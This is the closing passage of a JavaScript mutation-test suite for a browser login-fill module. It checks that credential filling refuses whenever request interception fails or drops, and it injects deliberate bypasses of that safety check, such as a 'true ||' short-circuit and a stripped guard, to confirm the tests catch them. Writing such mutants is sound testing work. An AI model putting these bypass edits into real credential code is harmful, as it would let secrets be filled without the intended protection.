            if (routeSrv) await new Promise((r) => routeSrv.close(r));
            dm.shutdown();
            await new Promise((r) => wssF.close(r));
          }
        };

        const pFetchErr = await runFenceFailProbe(Dm, 'fetch-error');
        const pFetchTimeout = await runFenceFailProbe(Dm, 'fetch-timeout');
        const pNetErr = await runFenceFailProbe(Dm, 'net-error');
        const pDropBeforeInsert = await runFenceFailProbe(Dm, 'drop-before-insert', { viaRoute: true });
        ok(!pFetchErr.first.ok && pFetchErr.first.code === 'login_fence_unavailable'
          && /Fetch\.enable failed: Fetch domain unavailable/.test(String(pFetchErr.first.error || ''))
          && pFetchErr.firstInserts === 0 && pFetchErr.firstResolves === 0
          && Boolean(pFetchErr.second && pFetchErr.second.ok && pFetchErr.totalInserts === 1)
          && !pFetchTimeout.first.ok && pFetchTimeout.first.code === 'login_fence_unavailable'
          && /Fetch\.enable timed out/.test(String(pFetchTimeout.first.error || ''))
          && pFetchTimeout.firstInserts === 0 && pFetchTimeout.firstResolves === 0
          && !pNetErr.first.ok && pNetErr.first.code === 'login_fence_unavailable'
          && /Network\.enable failed/.test(String(pNetErr.first.error || ''))
          && pNetErr.firstInserts === 0 && pNetErr.firstResolves === 0
          && pDropBeforeInsert.httpStatus === 409 && !pDropBeforeInsert.first.ok && pDropBeforeInsert.first.code === 'login_fence_unavailable'
          && /interception dropped before typing/.test(String(pDropBeforeInsert.first.error || ''))
          && pDropBeforeInsert.firstInserts === 0 && pDropBeforeInsert.firstResolves === 0,
          'r27 Compulsory 2: Fetch.enable error, Fetch.enable timeout, Network.enable error, and fence drop after preArmIntercept before typing (HTTP 409) all refuse login_fence_unavailable with 0 Input.insertText calls and 0 secret resolves (and recover cleanly on the next fill)',
          { pFetchErr, pFetchTimeout, pNetErr, pDropBeforeInsert });

        // MUTANT 31 RED (r27 Compulsory 2 `fence-unconfirmed-allowed` at runActiveFill / preArmIntercept):
        const m31BdSrc = editAnchor(bdSrc,
          '    const fenceConfirmed = (fm, needCred = false) => Boolean(',
          '    const fenceConfirmed = (fm, needCred = false) => true || Boolean('
        , "src/server/browser-dialogs.js");
        if (m31BdSrc !== bdSrc) {
          const DM_M31 = MUT.load('src/server/browser-dialogs.js', m31BdSrc, 'r27-c2-fence-unconfirmed-allowed');
          const mFetchErr = await runFenceFailProbe(DM_M31, 'fetch-error');
          const mFetchTimeout = await runFenceFailProbe(DM_M31, 'fetch-timeout');
          ok(mFetchErr.first.ok === true && mFetchErr.firstInserts === 1
            && mFetchTimeout.first.ok === true && mFetchTimeout.firstInserts === 1,
            'MUTANT 31 RED (r27 Compulsory 2 fence-unconfirmed-allowed): stripping fenceConfirmed lets both Fetch.enable error and Fetch.enable timeout proceed to Input.insertText (insertCalls=1)',
            { mFetchErr, mFetchTimeout });
        } else ok(false, 'MUTANT 31 RED (r27 Compulsory 2): anchor not found');

        // MUTANT 32 RED (r27 Compulsory 2 3rd fence check inside `guardBeforeInsert` at `:3936`):
        // Keep `runActiveFill` (:3803) and `preArmIntercept` (:3922) intact, strip ONLY the `guardBeforeInsert` check!
        const m32BdSrc = editAnchor(bdSrc,
          "          if (!fenceConfirmed({ ok: true }, pre.field !== 'user')) {\n            return { ok: false, code: 'login_fence_unavailable', error: 'refused to fill because browser request interception dropped before typing — nothing was filled' };\n          }",
          '          /* MUTANT 32: 3rd fence check in guardBeforeInsert stripped */'
        , "src/server/browser-dialogs.js");
        if (m32BdSrc !== bdSrc) {
          const DM_M32 = MUT.load('src/server/browser-dialogs.js', m32BdSrc, 'r27-c2-guard-before-insert-fence-stripped');
          const mDrop = await runFenceFailProbe(DM_M32, 'drop-before-insert');
          ok(mDrop.first.ok === true && mDrop.firstInserts === 1 && mDrop.firstResolves === 1,
            'MUTANT 32 RED (r27 Compulsory 2 guardBeforeInsert-fence-stripped): stripping ONLY the 3rd fence check in guardBeforeInsert lets a post-preArm fence drop resolve the secret and call Input.insertText (insertCalls=1, resolveCalls=1)',
            mDrop);
        } else ok(false, 'MUTANT 32 RED (r27 Compulsory 2): anchor not found');
      }
    } finally {
      LF.clearAllFilledSecrets?.();
      LF_M15?.clearAllFilledSecrets?.();
      engR24.close();
      await fkR24.close();
      fs.rmSync(dirM10, { recursive: true, force: true });
    }
  }

  await runR28LoginNails({ repoDir: REPO, ok, MUT });
  const [r29Child, r30Child] = await Promise.all([r29ChildPromise, r30ChildPromise]);
  replayNailChild(r29Child, runR29LoginNails);
  replayNailChild(r30Child, runR30LoginNails);

  // lane chrome-157 (the round-32 take-over): 34 — round 32 deleted the legs that pinned «a restart and an unlock restore» with
  // their mutants (M19 among them); the floor follows the copies this suite still makes (on the builder's bytes too: 34 of 35)
  for (const r of copiesCensus(MUT.files, MUT.dir, REPO, { minCopies: 34 })) {
    ok(r.pass, 'mutant-copy census: ' + r.name, r.pass ? undefined : r.detail);
  }
}

console.log(fail ? `\nFAIL (${fail} failed, ${pass} passed)` : `\nALL PASS (${pass})`);
process.exit(fail ? 1 : 0);
